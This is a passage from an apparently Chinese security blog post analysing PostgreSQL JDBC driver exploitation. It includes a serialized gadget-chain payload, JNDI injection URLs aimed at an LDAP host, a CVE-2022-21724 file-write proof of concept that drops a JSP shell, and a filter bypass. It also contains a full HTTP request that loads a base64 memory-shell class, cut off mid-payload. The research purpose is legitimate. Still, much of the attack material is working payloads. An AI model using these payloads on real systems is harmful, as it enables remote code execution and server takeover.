class="line">jdbc:postgresql:///?socketFactory=org.apache.activemq.shiro.env.IniEnvironment&amp;socketFactoryArg=%5Bmain%5D%0Abs%20%3D%20org.apache.activemq.util.ByteSequence%0Amessage%20%3D%20org.apache.activemq.command.ActiveMQObjectMessage%0Abs.data%20%3D%20rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA%2Fb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y%2B%2FSZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB%2BAARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAAAU3K%2Frq%2BAAAAMQAWAQA0b3JnL2FwYWNoZS93aWNrZXQvYmF0aWsvYnJpZGdlL1NWR0Jyb2tlbkxpbmtQcm92aWRlcgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAGgACAAEAAAAOKrcACbgADxIRtgAVV7EAAAAAAAB1cQB%2BABAAAAEayv66vgAAADQAEQEANW9yZy9hcGFjaGUvY29tbW9ucy9qYW0vcHJvdmlkZXIvSmFtU2VydmljZUZhY3RvcnlJbXBsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABpKYW1TZXJ2aWNlRmFjdG9yeUltcGwuamF2YQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADAANCgAEAA4BAARDb2RlACEAAgAEAAAAAQAaAAcACAABAAsAAAACAAkAAQABAAwADQABABAAAAARAAEAAQAAAAUqtwAPsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHEAfgANeA%3D%3D%0Abs.length%20%3D%201628%0Abs.offset%20%3D%200%0Amessage.content%20%3D%20%24bs%0Amessage.trustAllPackages%20%3D%20true%0Amessage.object.x%20%3D%20x</span><br></pre></td></tr></table></figure>
+
+<h5 id="ihRex">HikariConfig</h5>
+利用 Properties 方式，走 HikariConfig 触发 JNDI，需要依赖 HikariCP
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=com.zaxxer.hikari.HikariConfi&amp;metricRegistry=ldap://127.0.0.1:1389/exp</span><br></pre></td></tr></table></figure>
+
+<h3 id="ARtJM">任意文件写入</h3>
+<h4 id="ldLXH">影响版本</h4>
+
+<p>该漏洞影响版本如下</p>
+<ul>
+<li><font style="color:rgb(36, 41, 47);">42.3.x &lt; 42.3.3</font></li>
+<li><font style="color:rgb(36, 41, 47);">42.1.x</font></li>
+</ul>
+<h4 id="JrAG1">漏洞环境</h4>
+漏洞触发如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cve_2022_21724_filewrite</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String loggerLevel=<span class="string">&quot;DEBUG&quot;</span>;</span><br><span class="line">        String loggerFile=<span class="string">&quot;hack.jsp&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;&lt;%25test;%25&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql:///?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="string">&quot;&amp;&quot;</span>+shellContent;</span><br><span class="line">        System.out.println(dbUrl);</span><br><span class="line">        DriverManager.getConnection(dbUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="xdkTh">漏洞分析</h4>
+
+<p>看到<code>postgresql</code>驱动的<code>connect</code>方法中，在<code>makeConnection</code>方法前，有<code>setupLoggerFromProperties</code>方法，是用来配置Logger信息的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723064881-30432783-88a2-4e3a-8ac0-0aca3b0cb354.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723064881-30432783-88a2-4e3a-8ac0-0aca3b0cb354.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟到<code>setupLoggerFromProperties</code>中，首先判断LogLevel为DEBUG，然后获取到我们的文件名为<code>hack.jsp</code>（这里文件中并没有对filename进行过滤，我们这里可以通过<code>../</code>进行目录穿越，上传到任何地方）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723231734-d2a51162-7923-442a-878f-98435a4af9fa.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723231734-d2a51162-7923-442a-878f-98435a4af9fa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>后面日志操作进行初始化，在文件夹下创建一个<code>hack.jsp</code>文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723419702-b8486237-9db8-45c3-a2a3-c1aaa48854ed.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723419702-b8486237-9db8-45c3-a2a3-c1aaa48854ed.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跳出<code>setupLoggerFromProperties</code>方法，下一步就进行了日志的记录，将我们的url记录到<code>hack.jsp</code>中，在java环境下，jsp文件中<code>&lt;% %&gt;</code>将被解析，也可以达到RCE的效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723581540-210c0973-e416-4eca-9ecf-14754e7459eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723581540-210c0973-e416-4eca-9ecf-14754e7459eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><code>hack.jsp</code>效果如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723759099-880ec78e-280d-4513-9e10-4690d5d38f01.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723759099-880ec78e-280d-4513-9e10-4690d5d38f01.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="PvIWE">其他利用方式</h4>
+<h5 id="NXNu0">log4j2</h5>
+在导入log4j版本为存在漏洞版本时，就可能配合log4j2实现JNDI注入
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:///$&#123;jndi:ldap://127.0.0.1:1389/exp&#125;?loggerLevel=TRACE&amp;loggerFile=log.log</span><br></pre></td></tr></table></figure>
+
+<h5 id="DQF19">jar/war包等zip包</h5>
+
+<p>此种利用方式就是生成一个纯 ASCII 范围内的 ZIP，并结合环境进行 Jar 包加载、War 包部署等姿势</p>
+<h3 id="Y6juf">漏洞修复</h3>
+漏洞修复，是在各个接口实例化时，加上了期望类的判断
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752807025171-eabc64e9-b691-452f-b6bb-dfa90ec0261e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752807025171-eabc64e9-b691-452f-b6bb-dfa90ec0261e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h2 id="QUkZI">PostgreSQL不出网利用</h2>
+<h3 id="XjfxO">漏洞分析</h3>
+
+<p>这里直接拿p神的挑战，来进行分析</p>
+<p>在我们到Controller之前，首先要经过一个Filter，要求我们的参数中不能同时包含<code>jdbc:postgresql</code>和<code>socketFactory</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752762574412-9a660e34-1f90-4205-8140-6ead46619902.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752762574412-9a660e34-1f90-4205-8140-6ead46619902.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>这里我们利用<code>getParameter</code>方法和在controller来get参数解析差异进行绕过，<code>getParameter</code>方法在有多个url参数时，只获取第一个url</p>
+<p>传入url如下</p>
+<p>可以看到在Filter中<code>request.getParameter(url)</code>方法中，接收到的只有<code>jdbc:postgresql://127.0.0.1:5432/test/?a=</code>，这里的url并不同时包含<code>jdbc:postgresql</code>和<code>socketFactory</code>，因此我们可以走到Controller中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=jdbc:postgresql://127.0.0.1:5432/test/?a=&amp;url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=1 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763086097-c6e7ab4c-4897-4751-a479-a04e7be07a4f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763086097-c6e7ab4c-4897-4751-a479-a04e7be07a4f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>走到Controller中，我们可以看到，接受的参数为<code>jdbc:postgresql://127.0.0.1:5432/test/?a=,&amp;socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=1</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763263976-ea3c636c-a5c8-4106-a6f2-648d7120cd50.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763263976-ea3c636c-a5c8-4106-a6f2-648d7120cd50.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>这里通过一个<code>,</code>替换了<code>&amp;url</code>，以逗号为分隔符，将两个url参数拼接到一起，这样就可以成功绕过Filter的阻碍</p>
+<p>我们继续看到Controller中，这里这段代码，直接禁止程序进行网络访问操作（之前不知道，现在才理解了为什么会有那么多不出网情况下的利用），因此我们无法通过http请求来获取Poc里面的值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">ForbiddenNetworkAccessSecurityManager</span>());</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763719916-dfcbc403-0a67-49ce-b8f8-3bf8e5d3d261.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763719916-dfcbc403-0a67-49ce-b8f8-3bf8e5d3d261.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>接下来就要解析Url里面的环境变量了</p>
+<p>我们使用<code>$&#123;catalina.home&#125;</code>作为<code>socketFactoryArg</code>的值</p>
+<p>跟到<code>ClassPathXmlApplicationContext</code>的构造方法内，走入<code>setConfigLoacations</code>方法中，里面有个<code>resolvePath</code>，继续跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768356045-d359de20-270d-4f15-846d-2167fab6f555.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768356045-d359de20-270d-4f15-846d-2167fab6f555.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>resolvePath</code>后继续跟入<code>getEnvironment</code>方法内，这里的<code>createEnvronment</code>创建了一个<code>StandardEnvironment</code>对象，这个对象是spring中用来处理环境变量的类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768495825-c674ae7b-e851-41de-ba72-24b0df61ce33.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768495825-c674ae7b-e851-41de-ba72-24b0df61ce33.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>步出，准备跟进<code>resolveRequiredPlaceholders</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768596070-522bf67d-bdfe-4b68-a767-14ae4b830b28.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768596070-522bf67d-bdfe-4b68-a767-14ae4b830b28.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>继续跟进<code>doResolcePlaceholders</code>方法，应该是通过构造的<code>strictHelper</code>对text的内容进行解析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768664431-c9c4f69e-0d82-4119-8b47-7882077a967b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768664431-c9c4f69e-0d82-4119-8b47-7882077a967b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>一步一步跟到<code>parseStringValue</code>中，这里将<code>$&#123;&#125;</code>中的内容截取出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768890828-5fb8ed53-4d96-470c-892f-4aa004f88995.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768890828-5fb8ed53-4d96-470c-892f-4aa004f88995.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>然后将<code>catalina.home</code>的值解析成了我们tomcat临时文件的路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752769005198-ec3c7766-57d3-4d44-bdd3-b76341b62cb9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752769005198-ec3c7766-57d3-4d44-bdd3-b76341b62cb9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>当我们以文件上传的格式传入数据时，就会创建这个临时文件，内容是我们所上传的东西，在调用完成后这个文件就会消失</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752804841499-dbae363f-de51-4f74-a2e1-10c3ea5f2b8f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752804841499-dbae363f-de51-4f74-a2e1-10c3ea5f2b8f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>临时文件的名称是随机的，但是我们可以通过通配符来匹配临时文件从而进行命令执行，这里我们将<code>socketFactoryArg</code>的值替换为<code>file://$&#123;catalina.home&#125;/**/*.tmp</code>进行分析</p>
+<p>在refresh方法中，进行加载文件时，会走到getResources方法中，调用栈如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getResources:<span class="number">279</span>, PathMatchingResourcePatternResolver (org.springframework.core.io.support)</span><br><span class="line">getResources:<span class="number">1423</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">231</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">203</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">265</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">128</span>, AbstractXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">94</span>, AbstractXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">refreshBeanFactory:<span class="number">130</span>, AbstractRefreshableApplicationContext (org.springframework.context.support)</span><br><span class="line">obtainFreshBeanFactory:<span class="number">671</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:<span class="number">553</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:<span class="number">144</span>, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:<span class="number">85</span>, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br></pre></td></tr></table></figure>
+
+<p>经过一些判断后，最终会走到<code>isPattern</code>方法处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803786059-4c245832-5a15-48b2-b736-d1c5bc4a1586.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803786059-4c245832-5a15-48b2-b736-d1c5bc4a1586.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>我们跟进查看一下该方法，可看到该方法里面的代码逻辑是判断：路径字符中是否有用通配符，从而决定是否要做模式匹配搜索</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803847284-7c42f944-d291-4ecc-92cb-2c0c9585840d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803847284-7c42f944-d291-4ecc-92cb-2c0c9585840d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>走入<code>findPathMatchingResources</code>方法中，跟进<code>doFindPathMatchingFileResources</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805221675-11c63fc2-459b-46c5-b9fa-7cf383298346.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805221675-11c63fc2-459b-46c5-b9fa-7cf383298346.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><code>doFindPathMatchingFileResources</code>方法中，就可以找到我们的临时文件，最后通过file协议读取内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805413860-11b337eb-848e-489d-a400-7084bd98a886.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805413860-11b337eb-848e-489d-a400-7084bd98a886.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>通过JavaChains构建一个回显马xml，然后构造数据包进行请求</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805581279-0ff4c97a-7c4d-40e8-b895-ee2727b6d2b6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805581279-0ff4c97a-7c4d-40e8-b895-ee2727b6d2b6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">构造数据包如下，一个数据包就可以完成不出网的利用</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jdbc?url=jdbc:postgresql:///test/?a=&amp;url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=file://%24%7bcatalina.home%7d/**/*.tmp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.111.1:8080</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Authorization</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryIg9FMRJD9ScjO8dH</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>135</span><br><span class="line"></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH</span></span><br><span class="line"><span class="language-bash">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="language-bash">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="language-bash">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="language-bash">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;decoder&quot;</span> class=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;staticMethod&quot;</span> value=<span class="string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;arguments&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">            &lt;list&gt;</span></span><br><span class="line"><span class="language-bash">                &lt;value&gt;yv66vgAAADIBOwEAXm9yZy9hcGFjaGUvY29tbW9tcy9iZWFudXRpbHMvY295b3RlL2ludHJvc3BlY3QvQW5ub3RhdGVkTWVtYmVyMjA5ZjAxMzVmYzM5NDY2ZDg0ZWY3NWZlODA2YmZjYjgHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcABwwABQAGCgAEAAkBAANydW4MAAsABgoAAgAMAQAQZ2V0UmVxSGVhZGVyTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAPWC1BdXRob3JpemF0aW9uCAAQAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwASAQATamF2YS9sYW5nL1Rocm93YWJsZQcAFAEAEGphdmEvbGFuZy9UaHJlYWQHABYBAApnZXRUaHJlYWRzCAAYAQAPamF2YS9sYW5nL0NsYXNzBwAaAQASW0xqYXZhL2xhbmcvQ2xhc3M7BwAcAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAeAB8KABsAIAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAIgEADXNldEFjY2Vzc2libGUBAAQoWilWDAAkACUKACMAJgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAKAApCgAjACoBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwAsAQAHZ2V0TmFtZQwALgAPCgAXAC8BAARodHRwCAAxAQAQamF2YS9sYW5nL1N0cmluZwcAMwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAA1ADYKADQANwEACEFjY2VwdG9yCAA5AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAA7ADwKAAQAPQEABnRhcmdldAgAPwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAEEAQgoAGwBDAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAEUKAEYAJgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABIAEkKAEYASgEACGVuZHBvaW50CABMAQAGdGhpcyQwCABOAQAHaGFuZGxlcggAUAEADWdldFN1cGVyY2xhc3MMAFIAPAoAGwBTAQAGZ2xvYmFsCABVAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DABXAFgKABsAWQEAIm9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3RHcm91cEluZm8IAFsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAF0BAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DABfAGAKAF4AYQoAGwAvAQAKcHJvY2Vzc29ycwgAZAEAE2phdmEvdXRpbC9BcnJheUxpc3QHAGYBAARzaXplAQADKClJDABoAGkKAGcAagEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwASABsCgBnAG0BAANyZXEIAG8BAAdnZXROb3RlCABxAQARamF2YS9sYW5nL0ludGVnZXIHAHMBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAHUAdgkAdAB3AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMAHkAegoAdAB7AQAJZ2V0SGVhZGVyCAB9AQAJZ2V0TWV0aG9kDAB/AB8KABsAgAwADgAPCgACAIIBAAtnZXRSZXNwb25zZQgAhAEACWdldFdyaXRlcggAhgEADmphdmEvaW8vV3JpdGVyBwCIAQAGaGFuZ